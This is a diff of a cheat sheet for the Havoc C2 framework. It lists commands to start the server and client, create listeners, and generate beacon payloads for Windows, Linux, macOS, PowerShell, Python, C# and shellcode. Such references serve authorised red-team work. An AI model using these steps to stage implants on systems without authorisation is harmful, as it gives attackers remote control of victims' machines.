@@ -1,32 +1,101 @@
-% cat/C2
 # Havoc C2
-## Basic Usage
-### Start Havoc Server
+
+% havoc
+
+#plateform/linux #target/remote #cat/C2 #tag/command-control
+
+## Start Havoc Server
+#cat/SETUP 
 ```
 sudo ./havoc server
 ```
-### Start Havoc Client
+
+## Start Havoc Client
+#cat/SETUP 
 ```
 ./havoc client
 ```
-## Payloads
-### Generate Listener
+
+## Generate Listener
+#cat/SETUP 
 ```
-havoc listener --name my_listener --host 192.168.1.100 --port 443
+havoc listener --name <listener_name> --host <ip> --port <port>
 ```
-### Generate Payload (Windows EXE)
+
+## Generate Windows EXE Payload
+#cat/PAYLOAD 
 ```
-havoc payload --listener my_listener --format exe --output beacon.exe
+havoc payload --listener <listener_name> --format exe --output <output_file>
 ```
-### Generate Payload (Windows DLL)
+
+## Generate Windows DLL Payload
+#cat/PAYLOAD 
 ```
-havoc payload --listener my_listener --format dll --output beacon.dll
+havoc payload --listener <listener_name> --format dll --output <output_file>
 ```
-### Generate Payload (Shellcode)
+
+## Generate Shellcode Payload
+#cat/PAYLOAD 
 ```
-havoc payload --listener my_listener --format shellcode --output beacon.bin
+havoc payload --listener <listener_name> --format shellcode --output <output_file>
 ```
-### Generate Payload (Raw)
+
+## Generate Raw Payload
+#cat/PAYLOAD 
 ```
-havoc payload --listener my_listener --format raw --output beacon.raw
+havoc payload --listener <listener_name> --format raw --output <output_file>
+```
+
+## Generate PowerShell Payload
+#cat/PAYLOAD 
+```
+havoc payload --listener <listener_name> --format powershell --output <output_file>
+```
+
+## Generate Python Payload
+#cat/PAYLOAD 
+```
+havoc payload --listener <listener_name> --format python --output <output_file>
+```
+
+## Generate C# Payload
+#cat/PAYLOAD 
+```
+havoc payload --listener <listener_name> --format csharp --output <output_file>
+```
+
+## Generate Linux Payload
+#cat/PAYLOAD 
+```
+havoc payload --listener <listener_name> --format linux --output <output_file>
+```
+
+## Generate MacOS Payload
+#cat/PAYLOAD 
+```
+havoc payload --listener <listener_name> --format macos --output <output_file>
+```
+
+## List Available Listeners
+#cat/UTILS 
+```
+havoc listener --list
+```
+
+## List Available Payload Formats
+#cat/UTILS 
+```
+havoc payload --formats
+```
+
+## Show Payload Help
+#cat/UTILS 
+```
+havoc payload --help
+```
+
+## Show Listener Help
+#cat/UTILS 
+```
+havoc listener --help
 ```
